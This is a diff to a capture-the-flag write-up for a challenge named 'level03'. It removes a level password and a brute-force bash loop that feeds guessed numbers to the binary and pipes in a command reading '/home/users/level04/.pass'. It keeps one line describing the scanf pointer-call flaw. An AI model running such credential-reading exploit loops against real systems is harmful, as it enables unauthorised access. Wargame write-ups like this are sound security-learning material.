@@ -1,10 +1,3 @@
-322424827
-
-kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf
-
-for i in {322424824..322424845} ; do ( echo $i ; sleep .1 ; echo 'cat /home/users/level04/.pass') | ./level03 | grep -v '*' | grep -v 'Password' ; done
-
-
 # level03
 
 The executable reads a number with `scanf` and, after a few conditions and operations on it, dereferences it and calls it like a pointer.
